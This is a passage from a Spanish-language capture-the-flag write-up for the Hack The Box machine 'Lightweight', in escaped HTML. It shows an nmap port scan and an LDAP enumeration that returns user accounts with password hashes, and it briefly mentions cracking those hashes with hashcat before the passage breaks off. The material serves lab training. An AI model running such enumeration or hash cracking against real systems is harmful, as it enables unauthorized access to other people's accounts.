xnBvylPWksctjHHmFp+S5BB6di9ZNY3QHWzPpKs7z98+2MfyhRa+GykEefclxdxwujU17u+6Z3mM6kkttPAJg4tvxmxxyRZSZNw+bHuY0rIqvFvn4WxehVGeZDQ/juX2MeaPoR/N4s1fwcmoTbLqODVJgyNtzgvhwZPvKwBzSuw/FBlYG5cLBow3ObFxFaJpE/E/ZyjkIW7XUdm/msh7OUrecpj+2nSKj4exChr6GzlqI7dx/iffod98i++vhIUz9OyccnuH2Erw33dd2DF7s5mM/aazL8e2D6pZte4H3HzsOfyjRwnNaiZPBmuKi5ctEDkwSOKdLvILJ2Avmc1H8+/n7dee5YGmPmomR8gNWJuj61u2X37XCiAlUHi+6RehisiPzp0v8Nt3TLwpGl+rGKVacbCW+lAiSQWCwlDA1FcsziXL2W3FKRuEDc0BZeUmheHs1vC3Tmy9bMzPKVOCsHc0PmJWRLd80OaYbxz3kFFonuejRgMcA7ISwp5goF+lr1NBzUoeXxcGhZQ7kn3UuK/191+mzM9J332q/sZD5yPfvHqmemesWNPxBZ4n8TyJAHRNIAWoBvz7cKG/OsHbdUXWH40NnUf+n/Q/O4GUCO/ZhpswjbXC0Bb6khqhiCIJAYEcU6Q8je/v1Wz7JXFve/unuS90/QfGayJHHHOHfwAAAABJRU5ErkJggg==&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.119&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/13340&#34;&gt;0xEA31&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/13340&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.3, 6.1, 4.5, 5.5, 3.9],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;En el resultado del escaneo de puertos tcp con nmap nos muestra tres puertos abiertos ssh, http y ldap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:20:40 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sC -sV -o tcp 10.10.10.119
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.119
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http    Apache httpd 2.4.6 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2018-06-09T13:32:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2019-06-09T13:32:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; at Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:21:22 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; -- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 41.92 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap-script-ldapsearch-&#34;&gt;NMAP SCRIPT: LDAPSEARCH&lt;/h2&gt;
&lt;p&gt;Utilizamos el script de nmap ldapsearch para poder obtener informacion en el puerto de ldap abierto, obtenemos informacion relacionada con usuarios, correo electronico, contraseña, etc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:40:00 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sC -sV -p389 --script&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldap-search -o ldap-nmap 10.10.10.119
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.119
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE VERSION
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ldap-search: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Context: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: dcObject
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organization
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         o: lightweight htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         dc: lightweight
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Manager,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalRole
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: Manager
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         description: Directory Manager
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalUnit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         ou: People
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalUnit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         ou: Group
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser1,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uid: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         sn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         mail: ldapuser1@lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: person
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: inetOrgPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: shadowAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$6$3&lt;/span&gt;qx0SD9x&lt;span class=&#34;nv&#34;&gt;$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj&lt;/span&gt;.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowLastChange: &lt;span class=&#34;m&#34;&gt;17691&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMax: &lt;span class=&#34;m&#34;&gt;99999&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowWarning: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         loginShell: /bin/bash
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         homeDirectory: /home/ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser2,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uid: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         sn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         mail: ldapuser2@lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: person
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: inetOrgPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: shadowAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$6$xJxPjT0M$1&lt;/span&gt;m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowLastChange: &lt;span class=&#34;m&#34;&gt;17691&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMax: &lt;span class=&#34;m&#34;&gt;99999&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowWarning: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         loginShell: /bin/bash
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         homeDirectory: /home/ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser1,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixGroup
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;x
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser2,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixGroup
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;x
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_        gidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; at Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:40:14 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; -- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 14.17 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h1 id=&#34;hashcat&#34;&gt;HASHCAT&lt;/h1&gt;
&lt;p&gt;Ya que encontramos contraseñas encriptadas podriamos utilizar hashcat para realizar un ataque a contraseña pero este metodo podria tardar mucho tiempo tomando en cuenta el tamaño de nuestro diccionario, por lo que vamos a seguir buscando por otros lados acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
